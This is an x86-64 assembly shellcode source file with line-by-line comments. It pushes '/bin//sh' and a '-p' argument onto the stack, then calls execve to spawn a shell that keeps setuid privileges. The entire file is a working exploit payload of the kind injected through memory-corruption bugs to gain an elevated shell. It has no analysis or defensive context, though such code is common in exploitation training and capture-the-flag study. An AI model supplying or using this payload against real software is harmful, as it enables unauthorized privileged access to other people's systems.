.intel_syntax noprefix
.globl _start

.section .text
_start:

    SPAWN_SHELL:
        xor rax, rax 

        push rax                            # Push some nulls for string termination.
        mov  rcx, 0x68732F2f6e69622F        # Construct "/bin//sh".
        push rcx                            # Push "/bin//sh" to the stack.
        xor  rdi, rdi                       # Set up rdi.
        mov  rdi, rsp                       # Pointer to /bin//sh.

        # Construct the argv array.
        push rax                            # Push some nulls for string termination.
        xor rcx, rcx                        # Set up rcx.
        push 0x702d                         # Push "-p".
        mov rcx, rsp                        # Rcx now points to the "-p" string.

        push rax                            # Null-terminate the argv array.
        push rcx                            # Push the address of "-p" onto the stack.
        push rdi                            # Push the address of "/bin//sh" onto the stack.
        xor  rsi, rsi                       # Set up rsi.
        mov rsi, rsp                        # Rsi now points to the argument array.

        xor  rdx, rdx                       # NULL (An empty array for envp) (Linux accepts NULL instead of a pointer to NULL).

        mov al, 59                          # execve("/bin/sh", argv, envp).
        syscall
